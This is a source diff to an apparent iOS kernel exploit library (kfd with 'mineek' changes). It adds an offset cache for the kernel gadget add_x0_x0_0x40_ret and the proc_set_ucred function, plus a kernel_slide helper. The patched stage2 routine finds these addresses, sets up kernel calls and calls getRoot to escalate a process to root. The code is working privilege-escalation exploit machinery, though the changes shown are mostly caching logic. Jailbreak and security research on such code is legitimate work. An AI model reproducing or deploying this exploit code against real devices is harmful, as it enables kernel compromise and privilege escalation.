@@ -212,6 +212,7 @@ void kclose(u64 kfd)
 // BEGIN MINEEK CHANGES
 #include "IOKit.h"
 #include "mineekpf.h"
+#include "offsetcache.h"
 
 mach_port_t user_client;
 uint64_t fake_client;
@@ -379,10 +380,26 @@ void stage2(u64 kfd)
     struct kfd* kfd_struct = (struct kfd*)kfd;
     printf("patchfinding!\n");
     init_kernel(kfd_struct);
-    add_x0_x0_0x40_ret_func = find_add_x0_x0_0x40_ret(kfd_struct);
+    add_x0_x0_0x40_ret_func = getOffset(0);
+    if (add_x0_x0_0x40_ret_func == 0) {
+        printf("[-] add_x0_x0_0x40_ret_func not in cache, patchfinding\n");
+        add_x0_x0_0x40_ret_func = find_add_x0_x0_0x40_ret(kfd_struct);
+        setOffset(0, add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide);
+    } else {
+        printf("[+] add_x0_x0_0x40_ret_func in cache\n");
+        add_x0_x0_0x40_ret_func += kfd_struct->info.kernel.kernel_slide;
+    }
     printf("add_x0_x0_0x40_ret_func @ 0x%llx\n", add_x0_x0_0x40_ret_func);
     assert(add_x0_x0_0x40_ret_func != 0);
-    proc_set_ucred_func = find_proc_set_ucred_function(kfd_struct);
+    proc_set_ucred_func = getOffset(1);
+    if (proc_set_ucred_func == 0) {
+        printf("[-] proc_set_ucred_func not in cache, patchfinding\n");
+        proc_set_ucred_func = find_proc_set_ucred_function(kfd_struct);
+        setOffset(1, proc_set_ucred_func - kfd_struct->info.kernel.kernel_slide);
+    } else {
+        printf("[+] proc_set_ucred_func in cache\n");
+        proc_set_ucred_func += kfd_struct->info.kernel.kernel_slide;
+    }
     printf("proc_set_ucred_func @ 0x%llx\n", proc_set_ucred_func);
     assert(proc_set_ucred_func != 0);
     printf("patchfinding complete!\n");
@@ -394,6 +411,11 @@ void stage2(u64 kfd)
     init_kcall(kfd);
     printf("getRoot!\n");
     getRoot(kfd, proc_addr);
+}
+
+uint64_t kernel_slide(uint64_t kfd)
+{
+    return ((struct kfd*)kfd)->info.kernel.kernel_slide;
 }
 
 #endif /* libkfd_h */
